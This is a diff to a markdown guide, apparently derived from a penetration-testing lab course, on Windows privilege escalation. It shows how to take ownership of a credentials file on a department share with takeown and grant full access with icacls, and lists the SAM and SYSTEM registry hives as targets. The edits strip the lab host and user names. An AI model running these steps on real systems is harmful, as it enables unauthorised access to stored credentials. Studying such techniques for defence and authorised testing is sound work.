@@ -145,7 +145,7 @@ Common target file categories:
 | Registry hive backups | `SAM`, `SYSTEM`, `SECURITY` files in `%WINDIR%\repair\` or `%WINDIR%\System32\config\` |
 | Service binary paths | If service runs as SYSTEM and the binary is replaceable |
 
-The original source-document example uses a file share `C:\Department Shares\Private\IT\cred.txt`. This pattern (a department share with a credentials file) is operationally common.
+A common real-world example uses a file share `C:\Department Shares\Private\IT\cred.txt`. This pattern (a department share with a credentials file) is operationally common.
 
 ### Inspecting the target before action
 
@@ -167,19 +167,19 @@ C:\> cmd /c dir /q 'C:\Department Shares\Private\IT'
 
  Directory of C:\Department Shares\Private\IT
 
-06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
-06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
+06/18/2021  12:22 PM    <DIR>          SRV01\sccm_svc  .
+06/18/2021  12:22 PM    <DIR>          SRV01\sccm_svc  ..
 06/18/2021  12:23 PM                36 ...                    cred.txt
 ```
 
-`/q` shows owner. `WINLPE-SRV01\sccm_svc` owns the parent directory - a service account, suggesting an automated process maintains this file. Useful context for understanding what you're disrupting if you change ownership.
+`/q` shows owner. `SRV01\sccm_svc` owns the parent directory - a service account, suggesting an automated process maintains this file. Useful context for understanding what you're disrupting if you change ownership.
 
 ### Taking ownership
 
 ```cmd
 C:\> takeown /f "C:\Department Shares\Private\IT\cred.txt"
 
-SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
+SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "SRV01\student".
 ```
 
 The current user is now the file's owner. Confirm:
@@ -190,7 +190,7 @@ PS> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' |
 
 Name     Directory                       Owner
 ----     ---------                       -----
-cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
+cred.txt C:\Department Shares\Private\IT SRV01\student
 ```
 
 `takeown` flags worth knowing:
@@ -215,7 +215,7 @@ cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
 Still denied because the DACL hasn't been changed. Fix it:
 
 ```cmd
-C:\> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+C:\> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant student:F
 
 processed file: C:\Department Shares\Private\IT\cred.txt
 Successfully processed 1 files; Failed processing 0 files
